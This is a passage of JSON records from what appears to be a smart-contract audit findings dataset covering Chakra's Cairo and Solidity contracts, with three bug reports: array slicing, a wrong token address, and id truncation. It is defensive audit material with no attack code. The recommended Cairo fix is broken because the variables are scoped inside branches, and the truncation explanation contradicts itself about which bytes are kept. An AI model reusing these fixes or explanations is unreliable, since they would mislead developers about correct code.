or more elements than intended, or even fail to slice the array correctly due to an out of bounds error.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L429\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L446\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L429\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L446\n\n\n# Vulnerability details\n\n## Impact\nArray slicing is done wrongly causing unintended values to end up in sliced array or possible out of bounds error.\n\n## Proof of Concept\nThe u128_array_slice and u64_array_slice functions are intended to return a slice (sub-array) of an input array src of u128 and u64 elements, starting from a specified begin index and ending at a specified end index. However, the current implementation wrongly calculates where the slicing is meant to end leading to a wrong slicing of the array.\n\n```\nlet len = begin + end;\n```\nThe len variable above used to determine the number of iterations of elements to be slices is calculated by adding the specified begin and end inputs. Which shouldnt be so, as in standard array slicing, the end represents the index at which the slicing stops. Therefore adding it to the begin index and using the sum as the point to stop the slicing will cause it return fewer or more elements than intended, or even fail to slice the array correctly due to an out of bounds error.\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nCalculate the len as follows:\n```\nif end > src.len() {\n    let len = src.len();\n}else {\n    let len = end;\n}\n```\n\n\n\n## Assessed type\n\nLoop\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L429\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L446\n\n\n# Vulnerability details\n\n## Impact\nArray slicing is done wrongly causing unintended values to end up in sliced array or possible out of bounds error.\n\n## Proof of Concept\nThe u128_array_slice and u64_array_slice functions are intended to return a slice (sub-array) of an input array src of u128 and u64 elements, starting from a specified begin index and ending at a specified end index. However, the current implementation wrongly calculates where the slicing is meant to end leading to a wrong slicing of the array. \n\n```\nlet len = begin + end;\n```\nThe len variable above used to determine the number of iterations of elements to be slices is calculated by adding the specified begin and end inputs. Which shouldnt be so, as in standard array slicing, the end represents the index at which the slicing stops. Therefore adding it to the begin index and using the sum as the point to stop the slicing will cause it return fewer or more elements than intended, or even fail to slice the array correctly due to an out of bounds error.\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nCalculate the len as follows:\n```\nif end > src.len() {\n    let len = src.len();\n}else {\n    let len = end;\n}\n```\n\n\n\n## Assessed type\n\nLoop"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-380", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 380, "page_start": null, "title": "Invalid token address used in `ChakraSettlementHandler::cross_chain_erc20_settlement(...)` leading to invalid transaction creation and event emission", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L160\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L218\n\n\n# Vulnerability details\n\n## Impact\n\nThe `ChakraSettlementHandler` incorrectly passes the contract address instead of the token one, when creating the `create_cross_txs` transaction and when emitting the `CrossChainLocked` event. The contract depends heavily on correct event emission as the protocol's validators listen for these events and execute state-changing operations based on them.\n\n## Proof of Concept\n\nThe `ChakraSettlementHandler::cross_chain_erc20_settlement(...)` function processes incoming cross-chain settlement user requests and sends data to the settlement contract. The method creates `CreatedCrossChainTx` along the way:\n\n```solidity\n    struct CreatedCrossChainTx {\n        uint256 txid;\n        string from_chain;\n        string to_chain;\n        address from;\n        uint256 to;\n        address from_token;\n        uint256 to_token;\n        uint256 amount;\n        CrossChainTxStatus status;\n    }\n```\n\nHowever, in the current implementation, instead of sending the `from_token` address it sends the actual contract address:\n\n```solidity\ncreate_cross_txs[txid] = CreatedCrossChainTx(\n                txid,\n                chain,\n                to_chain,\n                msg.sender,\n                to,\n@>              address(this), // @audit - this should be the global variable `token`\n                to_token,\n                amount,\n                CrossChainTxStatus.Pending\n            );\n```\n\nWhen the transaction is sent to the settlement contract a `CrossChainLocked` is emitted:\n\n```solidity\nevent CrossChainLocked(\n        uint256 indexed txid,\n        address indexed from,\n        uint256 indexed to,\n        string from_chain,\n        string to_chain,\n        address from_token,\n        uint256 to_token,\n        uint256 amount,\n        SettlementMode mode\n    );\n```\n\nHowever, the method, once more sends the incorrect `from_token` address:\n\n```solidity\nemit CrossChainLocked(\n            txid,\n            msg.sender,\n            to,\n            chain,\n            to_chain,\n@>          address(this), // @audit - this should be the global variable `token`\n            to_token,\n            amount,\n            mode\n        );\n```\n\nIf we peek into the Cairo implementation we can see that the `from_token` address should indeed be the token address not the handler contract address:\n\n```cairo\nfn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n__SNIP__\n            let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n                    tx_id: tx_id,\n                    from_chain: from_chain,\n                    to_chain: to_chain,\n                    from: get_contract_address(),\n                    to: to,\n@>                  from_token: self.token_address.read(), // proper token address passed\n                    to_token: to_token,\n                    amount: amount,\n                    tx_status: CrossChainTxStatus::PENDING\n                };\n__SNIPP\n\n            self.emit(\n                    CrossChainLocked{\n                        tx_id: tx_id,\n                        from: get_caller_address(),\n                        to: to,\n                        from_chain: get_tx_info().unbox().chain_id,\n                        to_chain: to_chain,\n                        from_token: self.token_address.read(), // proper token address passed\n                        to_token: to_token,\n                        amount: amount\n                    }\n                );\n            return tx_id;\n        }\n```\n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nUse the correct `from_token` address in  `ChakraSettlementHandler::cross_chain_erc20_settlement(...)`.\n\n```diff\ndiff --git a/solidity/handler/contracts/ChakraSettlementHandler.sol b/solidity/handler/contracts/ChakraSettlementHandler.sol\nindex 5d31ef9..b9cbd6d 100644\n--- a/solidity/handler/contracts/ChakraSettlementHandler.sol\n+++ b/solidity/handler/contracts/ChakraSettlementHandler.sol\n@@ -157,7 +157,7 @@ contract ChakraSettlementHandler is BaseSettlementHandler, ISettlementHandler {\n                 to_chain,\n                 msg.sender,\n                 to,\n-                address(this),\n+                token,\n                 to_token,\n                 amount,\n                 CrossChainTxStatus.Pending\n@@ -215,7 +215,7 @@ contract ChakraSettlementHandler is BaseSettlementHandler, ISettlementHandler {\n             to,\n             chain,\n             to_chain,\n-            address(this),\n+            token,\n             to_token,\n             amount,\n             mode\n```\n\n\n## Assessed type\n\nContext\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nThe `ChakraSettlementHandler` incorrectly passes the contract address instead of the token one, when creating the `create_cross_txs` transaction and when emitting the `CrossChainLocked` event. The contract depends heavily on correct event emission as the protocol's validators listen for these events and execute state-changing operations based on them.\n", "recommendation_md": "## Recommended Mitigation Steps\n\nUse the correct `from_token` address in  `ChakraSettlementHandler::cross_chain_erc20_settlement(...)`.\n\n```diff\ndiff --git a/solidity/handler/contracts/ChakraSettlementHandler.sol b/solidity/handler/contracts/ChakraSettlementHandler.sol\nindex 5d31ef9..b9cbd6d 100644\n--- a/solidity/handler/contracts/ChakraSettlementHandler.sol\n+++ b/solidity/handler/contracts/ChakraSettlementHandler.sol\n@@ -157,7 +157,7 @@ contract ChakraSettlementHandler is BaseSettlementHandler, ISettlementHandler {\n                 to_chain,\n                 msg.sender,\n                 to,\n-                address(this),\n+                token,\n                 to_token,\n                 amount,\n                 CrossChainTxStatus.Pending\n@@ -215,7 +215,7 @@ contract ChakraSettlementHandler is BaseSettlementHandler, ISettlementHandler {\n             to,\n             chain,\n             to_chain,\n-            address(this),\n+            token,\n             to_token,\n             amount,\n             mode\n```\n\n\n## Assessed type\n\nContext\n", "poc_md": "## Proof of Concept\n\nThe `ChakraSettlementHandler::cross_chain_erc20_settlement(...)` function processes incoming cross-chain settlement user requests and sends data to the settlement contract. The method creates `CreatedCrossChainTx` along the way:\n\n```solidity\n    struct CreatedCrossChainTx {\n        uint256 txid;\n        string from_chain;\n        string to_chain;\n        address from;\n        uint256 to;\n        address from_token;\n        uint256 to_token;\n        uint256 amount;\n        CrossChainTxStatus status;\n    }\n```\n\nHowever, in the current implementation, instead of sending the `from_token` address it sends the actual contract address:\n\n```solidity\ncreate_cross_txs[txid] = CreatedCrossChainTx(\n                txid,\n                chain,\n                to_chain,\n                msg.sender,\n                to,\n@>              address(this), // @audit - this should be the global variable `token`\n                to_token,\n                amount,\n                CrossChainTxStatus.Pending\n            );\n```\n\nWhen the transaction is sent to the settlement contract a `CrossChainLocked` is emitted:\n\n```solidity\nevent CrossChainLocked(\n        uint256 indexed txid,\n        address indexed from,\n        uint256 indexed to,\n        string from_chain,\n        string to_chain,\n        address from_token,\n        uint256 to_token,\n        uint256 amount,\n        SettlementMode mode\n    );\n```\n\nHowever, the method, once more sends the incorrect `from_token` address:\n\n```solidity\nemit CrossChainLocked(\n            txid,\n            msg.sender,\n            to,\n            chain,\n            to_chain,\n@>          address(this), // @audit - this should be the global variable `token`\n            to_token,\n            amount,\n            mode\n        );\n```\n\nIf we peek into the Cairo implementation we can see that the `from_token` address should indeed be the token address not the handler contract address:\n\n```cairo\nfn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n__SNIP__\n            let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n                    tx_id: tx_id,\n                    from_chain: from_chain,\n                    to_chain: to_chain,\n                    from: get_contract_address(),\n                    to: to,\n@>                  from_token: self.token_address.read(), // proper token address passed\n                    to_token: to_token,\n                    amount: amount,\n                    tx_status: CrossChainTxStatus::PENDING\n                };\n__SNIPP\n\n            self.emit(\n                    CrossChainLocked{\n                        tx_id: tx_id,\n                        from: get_caller_address(),\n                        to: to,\n                        from_chain: get_tx_info().unbox().chain_id,\n                        to_chain: to_chain,\n                        from_token: self.token_address.read(), // proper token address passed\n                        to_token: to_token,\n                        amount: amount\n                    }\n                );\n            return tx_id;\n        }\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L160\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L218\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L160\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L218\n\n\n# Vulnerability details\n\n## Impact\n\nThe `ChakraSettlementHandler` incorrectly passes the contract address instead of the token one, when creating the `create_cross_txs` transaction and when emitting the `CrossChainLocked` event. The contract depends heavily on correct event emission as the protocol's validators listen for these events and execute state-changing operations based on them.\n\n## Proof of Concept\n\nThe `ChakraSettlementHandler::cross_chain_erc20_settlement(...)` function processes incoming cross-chain settlement user requests and sends data to the settlement contract. The method creates `CreatedCrossChainTx` along the way:\n\n```solidity\n    struct CreatedCrossChainTx {\n        uint256 txid;\n        string from_chain;\n        string to_chain;\n        address from;\n        uint256 to;\n        address from_token;\n        uint256 to_token;\n        uint256 amount;\n        CrossChainTxStatus status;\n    }\n```\n\nHowever, in the current implementation, instead of sending the `from_token` address it sends the actual contract address:\n\n```solidity\ncreate_cross_txs[txid] = CreatedCrossChainTx(\n                txid,\n                chain,\n                to_chain,\n                msg.sender,\n                to,\n@>              address(this), // @audit - this should be the global variable `token`\n                to_token,\n                amount,\n                CrossChainTxStatus.Pending\n            );\n```\n\nWhen the transaction is sent to the settlement contract a `CrossChainLocked` is emitted:\n\n```solidity\nevent CrossChainLocked(\n        uint256 indexed txid,\n        address indexed from,\n        uint256 indexed to,\n        string from_chain,\n        string to_chain,\n        address from_token,\n        uint256 to_token,\n        uint256 amount,\n        SettlementMode mode\n    );\n```\n\nHowever, the method, once more sends the incorrect `from_token` address:\n\n```solidity\nemit CrossChainLocked(\n            txid,\n            msg.sender,\n            to,\n            chain,\n            to_chain,\n@>          address(this), // @audit - this should be the global variable `token`\n            to_token,\n            amount,\n            mode\n        );\n```\n\nIf we peek into the Cairo implementation we can see that the `from_token` address should indeed be the token address not the handler contract address:\n\n```cairo\nfn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n__SNIP__\n            let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n                    tx_id: tx_id,\n                    from_chain: from_chain,\n                    to_chain: to_chain,\n                    from: get_contract_address(),\n                    to: to,\n@>                  from_token: self.token_address.read(), // proper token address passed\n                    to_token: to_token,\n                    amount: amount,\n                    tx_status: CrossChainTxStatus::PENDING\n                };\n__SNIPP\n\n            self.emit(\n                    CrossChainLocked{\n                        tx_id: tx_id,\n                        from: get_caller_address(),\n                        to: to,\n                        from_chain: get_tx_info().unbox().chain_id,\n                        to_chain: to_chain,\n                        from_token: self.token_address.read(), // proper token address passed\n                        to_token: to_token,\n                        amount: amount\n                    }\n                );\n            return tx_id;\n        }\n```\n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nUse the correct `from_token` address in  `ChakraSettlementHandler::cross_chain_erc20_settlement(...)`.\n\n```diff\ndiff --git a/solidity/handler/contracts/ChakraSettlementHandler.sol b/solidity/handler/contracts/ChakraSettlementHandler.sol\nindex 5d31ef9..b9cbd6d 100644\n--- a/solidity/handler/contracts/ChakraSettlementHandler.sol\n+++ b/solidity/handler/contracts/ChakraSettlementHandler.sol\n@@ -157,7 +157,7 @@ contract ChakraSettlementHandler is BaseSettlementHandler, ISettlementHandler {\n                 to_chain,\n                 msg.sender,\n                 to,\n-                address(this),\n+                token,\n                 to_token,\n                 amount,\n                 CrossChainTxStatus.Pending\n@@ -215,7 +215,7 @@ contract ChakraSettlementHandler is BaseSettlementHandler, ISettlementHandler {\n             to,\n             chain,\n             to_chain,\n-            address(this),\n+            token,\n             to_token,\n             amount,\n             mode\n```\n\n\n## Assessed type\n\nContext\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L160\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L218\n\n\n# Vulnerability details\n\n## Impact\n\nThe `ChakraSettlementHandler` incorrectly passes the contract address instead of the token one, when creating the `create_cross_txs` transaction and when emitting the `CrossChainLocked` event. The contract depends heavily on correct event emission as the protocol's validators listen for these events and execute state-changing operations based on them.\n\n## Proof of Concept\n\nThe `ChakraSettlementHandler::cross_chain_erc20_settlement(...)` function processes incoming cross-chain settlement user requests and sends data to the settlement contract. The method creates `CreatedCrossChainTx` along the way:\n\n```solidity\n    struct CreatedCrossChainTx {\n        uint256 txid;\n        string from_chain;\n        string to_chain;\n        address from;\n        uint256 to;\n        address from_token;\n        uint256 to_token;\n        uint256 amount;\n        CrossChainTxStatus status;\n    }\n```\n\nHowever, in the current implementation, instead of sending the `from_token` address it sends the actual contract address:\n\n```solidity\ncreate_cross_txs[txid] = CreatedCrossChainTx(\n                txid,\n                chain,\n                to_chain,\n                msg.sender,\n                to,\n@>              address(this), // @audit - this should be the global variable `token`\n                to_token,\n                amount,\n                CrossChainTxStatus.Pending\n            );\n```\n\nWhen the transaction is sent to the settlement contract a `CrossChainLocked` is emitted:\n\n```solidity\nevent CrossChainLocked(\n        uint256 indexed txid,\n        address indexed from,\n        uint256 indexed to,\n        string from_chain,\n        string to_chain,\n        address from_token,\n        uint256 to_token,\n        uint256 amount,\n        SettlementMode mode\n    );\n```\n\nHowever, the method, once more sends the incorrect `from_token` address:\n\n```solidity\nemit CrossChainLocked(\n            txid,\n            msg.sender,\n            to,\n            chain,\n            to_chain,\n@>          address(this), // @audit - this should be the global variable `token`\n            to_token,\n            amount,\n            mode\n        );\n```\n\nIf we peek into the Cairo implementation we can see that the `from_token` address should indeed be the token address not the handler contract address:\n\n```cairo\nfn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n__SNIP__\n            let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n                    tx_id: tx_id,\n                    from_chain: from_chain,\n                    to_chain: to_chain,\n                    from: get_contract_address(),\n                    to: to,\n@>                  from_token: self.token_address.read(), // proper token address passed\n                    to_token: to_token,\n                    amount: amount,\n                    tx_status: CrossChainTxStatus::PENDING\n                };\n__SNIPP\n\n            self.emit(\n                    CrossChainLocked{\n                        tx_id: tx_id,\n                        from: get_caller_address(),\n                        to: to,\n                        from_chain: get_tx_info().unbox().chain_id,\n                        to_chain: to_chain,\n                        from_token: self.token_address.read(), // proper token address passed\n                        to_token: to_token,\n                        amount: amount\n                    }\n                );\n            return tx_id;\n        }\n```\n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nUse the correct `from_token` address in  `ChakraSettlementHandler::cross_chain_erc20_settlement(...)`.\n\n```diff\ndiff --git a/solidity/handler/contracts/ChakraSettlementHandler.sol b/solidity/handler/contracts/ChakraSettlementHandler.sol\nindex 5d31ef9..b9cbd6d 100644\n--- a/solidity/handler/contracts/ChakraSettlementHandler.sol\n+++ b/solidity/handler/contracts/ChakraSettlementHandler.sol\n@@ -157,7 +157,7 @@ contract ChakraSettlementHandler is BaseSettlementHandler, ISettlementHandler {\n                 to_chain,\n                 msg.sender,\n                 to,\n-                address(this),\n+                token,\n                 to_token,\n                 amount,\n                 CrossChainTxStatus.Pending\n@@ -215,7 +215,7 @@ contract ChakraSettlementHandler is BaseSettlementHandler, ISettlementHandler {\n             to,\n             chain,\n             to_chain,\n-            address(this),\n+            token,\n             to_token,\n             amount,\n             mode\n```\n\n\n## Assessed type\n\nContext"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-385", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 385, "page_start": null, "title": "Truncation Vulnerability in `MessageV1Codec.sol` Due to Incorrect `id` Type Casting", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-L58\n\n\n# Vulnerability details\n\n## **Impact**\n\nThe struct `Message` in `Message.sol` contains `id` which was defined as a `uint256`, but in the contract `MessageV1Codec.sol`, the function `id` is extracted from `_msg[1:33]` which contains 32 bytes and was cast to `byte8` which was further cast to `uint64`. This results in **truncation** of the `id`, where only the lower 64 bits of the value are retained, and the higher 192 bits are discarded. This truncation can lead to:\n\n1. **Loss of Data**: The full `uint256` `id` is not preserved, which can cause incorrect behavior if the `id` is used for critical operations.\n\n2. **Collision Risk**: Different `uint256` values could map to the same `uint64` value, leading to **id collisions**. An attacker could exploit this to manipulate the contract's behavior, especially if the `id` is used for transaction identification, cross-chain message handling, or access control.\n\n3. **Incorrect Logic**: If the contract logic relies on the full `uint256` `id` for uniqueness or correctness, truncating it to `uint64` could lead to incorrect behavior, such as misidentifying transactions or allowing unauthorized access.\n\n\n### **Proof of Concept**\n\n#### Code Reference:\n\n- **`Message.sol`**: The `id` is defined as a `uint256` in the `Message` struct.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/libraries/Message.sol#L32-L39\n\n  ```solidity\n  struct Message {\n      uint256 id;\n      PayloadType payload_type;\n      bytes payload;\n  }\n  ```\n\n- **`MessageV1Codec.sol`**: The `id` function incorrectly extracts only 8 bytes and casts it to `uint64`.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-L58\n\n  ```solidity\n  function id(bytes calldata _msg) internal pure returns (uint64) {\n      return uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n  }\n  ```\n\n#### Vulnerability Demonstration:\n\n1. **Truncation Example**:\n   - If the `id` is a `uint256` with the value:\n     ```solidity\n     uint256 id = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;\n     ```\n   - The current code in `MessageV1Codec.sol` will extract only the first 8 bytes and cast it to `uint64`:\n     ```solidity\n     uint64 truncatedId = uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n     ```\n   - This results in the truncated value:\n     ```solidity\n     truncatedId = 0x1234567890abcdef;\n     ```\n   - The higher-order bytes (`0x1234567890abcdef1234567890abcdef1234567890abcdef`) are lost, and only the lower 64 bits (`0x1234567890abcdef`) are retained.\n\n2. **Collision Example**:\n\nTwo different `bytes calldata _msg` can be give exactly the same id\n\n\n### **Tools Used**\n\n- Manual code review\n\n### **Recommended Mitigation Steps**\n\n1. **Update the `id` function in `MessageV1Codec.sol`** to extract the full 32 bytes and cast it to `uint256`, rather than truncating it to `uint64`. Here's the updated code:\n\n   ```solidity\n   function id(bytes calldata _msg) internal pure returns (uint256) {\n       require(_msg.length >= PAYLOAD_TYPE_OFFSET, \"Message too short\");\n       return uint256(bytes32(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n   }\n   ```\n\n2. **Ensure consistency** between the `id` type in `Message.sol` and `MessageV1Codec.sol`. If the `id` is defined as `uint256` in `Message.sol`, it should be handled as `uint256` throughout the codebase.\n\n\n\n## Assessed type\n\nUnder/Overflow\n", "sections": {"description_md": null, "impact_md": "## **Impact**\n\nThe struct `Message` in `Message.sol` contains `id` which was defined as a `uint256`, but in the contract `MessageV1Codec.sol`, the function `id` is extracted from `_msg[1:33]` which contains 32 bytes and was cast to `byte8` which was further cast to `uint64`. This results in **truncation** of the `id`, where only the lower 64 bits of the value are retained, and the higher 192 bits are discarded. This truncation can lead to:\n\n1. **Loss of Data**: The full `uint256` `id` is not preserved, which can cause incorrect behavior if the `id` is used for critical operations.\n\n2. **Collision Risk**: Different `uint256` values could map to the same `uint64` value, leading to **id collisions**. An attacker could exploit this to manipulate the contract's behavior, especially if the `id` is used for transaction identification, cross-chain message handling, or access control.\n\n3. **Incorrect Logic**: If the contract logic relies on the full `uint256` `id` for uniqueness or correctness, truncating it to `uint64` could lead to incorrect behavior, such as misidentifying transactions or allowing unauthorized access.\n", "recommendation_md": "### **Recommended Mitigation Steps**\n\n1. **Update the `id` function in `MessageV1Codec.sol`** to extract the full 32 bytes and cast it to `uint256`, rather than truncating it to `uint64`. Here's the updated code:\n\n   ```solidity\n   function id(bytes calldata _msg) internal pure returns (uint256) {\n       require(_msg.length >= PAYLOAD_TYPE_OFFSET, \"Message too short\");\n       return uint256(bytes32(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n   }\n   ```\n\n2. **Ensure consistency** between the `id` type in `Message.sol` and `MessageV1Codec.sol`. If the `id` is defined as `uint256` in `Message.sol`, it should be handled as `uint256` throughout the codebase.\n\n\n\n## Assessed type\n\nUnder/Overflow\n", "poc_md": "### **Proof of Concept**\n\n#### Code Reference:\n\n- **`Message.sol`**: The `id` is defined as a `uint256` in the `Message` struct.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/libraries/Message.sol#L32-L39\n\n  ```solidity\n  struct Message {\n      uint256 id;\n      PayloadType payload_type;\n      bytes payload;\n  }\n  ```\n\n- **`MessageV1Codec.sol`**: The `id` function incorrectly extracts only 8 bytes and casts it to `uint64`.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-L58\n\n  ```solidity\n  function id(bytes calldata _msg) internal pure returns (uint64) {\n      return uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n  }\n  ```\n\n#### Vulnerability Demonstration:\n\n1. **Truncation Example**:\n   - If the `id` is a `uint256` with the value:\n     ```solidity\n     uint256 id = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;\n     ```\n   - The current code in `MessageV1Codec.sol` will extract only the first 8 bytes and cast it to `uint64`:\n     ```solidity\n     uint64 truncatedId = uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n     ```\n   - This results in the truncated value:\n     ```solidity\n     truncatedId = 0x1234567890abcdef;\n     ```\n   - The higher-order bytes (`0x1234567890abcdef1234567890abcdef1234567890abcdef`) are lost, and only the lower 64 bits (`0x1234567890abcdef`) are retained.\n\n2. **Collision Example**:\n\nTwo different `bytes calldata _msg` can be give exactly the same id\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-L58\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n### **Tools Used**\n\n- Manual code review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-L58\n\n\n# Vulnerability details\n\n## **Impact**\n\nThe struct `Message` in `Message.sol` contains `id` which was defined as a `uint256`, but in the contract `MessageV1Codec.sol`, the function `id` is extracted from `_msg[1:33]` which contains 32 bytes and was cast to `byte8` which was further cast to `uint64`. This results in **truncation** of the `id`, where only the lower 64 bits of the value are retained, and the higher 192 bits are discarded. This truncation can lead to:\n\n1. **Loss of Data**: The full `uint256` `id` is not preserved, which can cause incorrect behavior if the `id` is used for critical operations.\n\n2. **Collision Risk**: Different `uint256` values could map to the same `uint64` value, leading to **id collisions**. An attacker could exploit this to manipulate the contract's behavior, especially if the `id` is used for transaction identification, cross-chain message handling, or access control.\n\n3. **Incorrect Logic**: If the contract logic relies on the full `uint256` `id` for uniqueness or correctness, truncating it to `uint64` could lead to incorrect behavior, such as misidentifying transactions or allowing unauthorized access.\n\n\n### **Proof of Concept**\n\n#### Code Reference:\n\n- **`Message.sol`**: The `id` is defined as a `uint256` in the `Message` struct.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/libraries/Message.sol#L32-L39\n\n  ```solidity\n  struct Message {\n      uint256 id;\n      PayloadType payload_type;\n      bytes payload;\n  }\n  ```\n\n- **`MessageV1Codec.sol`**: The `id` function incorrectly extracts only 8 bytes and casts it to 